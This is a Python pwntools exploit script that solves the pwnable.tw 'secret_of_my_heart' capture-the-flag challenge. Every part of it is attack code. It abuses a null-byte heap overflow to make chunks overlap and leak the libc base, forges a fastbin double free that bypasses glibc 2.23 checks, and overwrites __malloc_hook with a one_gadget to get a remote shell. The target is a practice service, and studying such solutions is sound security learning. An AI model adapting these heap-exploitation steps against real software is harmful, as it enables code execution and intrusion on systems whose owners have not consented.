from pwn import *
import sys

elf = ELF('secret_of_my_heart')
if sys.argv[1] == 'r':
    p = remote('chall.pwnable.tw', 10302)
    libc = ELF('libc_64.so.6')
    one_gadgets = [0xf0567, 0x4526a, 0xef6c4, 0x45216]
    offset_libc = 0x3c3b78
elif sys.argv[1] == 'l':
    p = process('./secret_of_my_heart_local', aslr=True, env={"LD_PRELOAD":"libc-2.23.so"})
    libc = ELF('libc-2.23.so')
    one_gadgets = [0x4527a, 0x45226, 0xf0364, 0xf1207]
    offset_libc = 0x3c4b78
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc.pidof(p)[0], gdbscript='''
                                        continue
                                        ''')
def add_secret(size, name, secret):
    p.sendlineafter("Your choice :", "1")
    p.sendlineafter("Size of heart :", str(size))
    p.sendafter("Name of heart :", name)
    p.sendafter("secret of my heart :", secret)

def show_secret(index):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index :", str(index))

def del_secret(index):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index :", str(index))

def solve():
    add_secret(0xf8, "A"*32, "A"*0x8)       # chunk 0
    add_secret(0x68, "B"*32, "B"*0x8)       # chunk 1
    add_secret(0x68, "B"*32, "B"*0x8)       # chunk 2
    add_secret(0x68, "B"*32, "B"*0x8)       # chunk 3
    add_secret(0x68, "B"*32, "B"*0x8)       # chunk 4
    add_secret(0x68, "B"*32, "B"*0x8)       # chunk 5
    add_secret(0x100, "B"*32, "B"*0xf0 + p64(0) + p64(0x31))       # chunk 6 
    add_secret(0x10, "C"*32, "C"*0x8)       # chunk 7 (avoid merge to top chunk)
    
    del_secret(0)                           # put chunk 0 to unsorted bin
    
    # delete chunk 5 and add it again to null-byte overflow chunk 6
    del_secret(5)                           #
    add_secret(0x68, "A"*32, "A"*0x60 + p64(0x330))       # chunk 0

    # free chunk 6 cause heap consolidation
    del_secret(6)                       

    # add a chunk to push the fd pointer to chunk 1
    add_secret(0xf8, "A"*32, "A"*0x8)       # chunk 5
    
    # leak libc with chunk 1
    show_secret(1)          
    libc.address = u64(p.recvuntil("==================================")[-41:-35] + '\x00\x00') - offset_libc
    malloc_hook = libc.symbols["__malloc_hook"]
    free_hook = libc.symbols["__free_hook"]
    one_gadget = libc.address + one_gadgets[2]
    success("libc address: %s"%hex(libc.address))
    success("malloc hook: %s"%hex(malloc_hook))
    success("free hook: %s"%hex(free_hook))
    success("one gadget: %s"%hex(one_gadget))

    # add a chunk which overlap with chunk 1
    add_secret(0x68, "D"*32, "D"*0x8)       # chunk 6

    # now chunk 1 and chunk 6 have the same address => double free
    del_secret(1)                           
    del_secret(3)       # bypass double free fastbin protection in glibc 2.23
    del_secret(6)

    # overwrite malloc_hook with one_gadget
    add_secret(0x68, "S"*32, p64(malloc_hook-0x23))
    add_secret(0x68, "S"*32, "S"*0x8)
    add_secret(0x68, "S"*32, "S"*0x8)
    # p.interactive()

    add_secret(0x68, "S"*32, '\x00'*0x13 + p64(one_gadget))
    p.interactive()

    # double free trigger printerr => pop shell 
    del_secret(1)
    del_secret(6)
    p.interactive()

if __name__ == "__main__":
    solve()
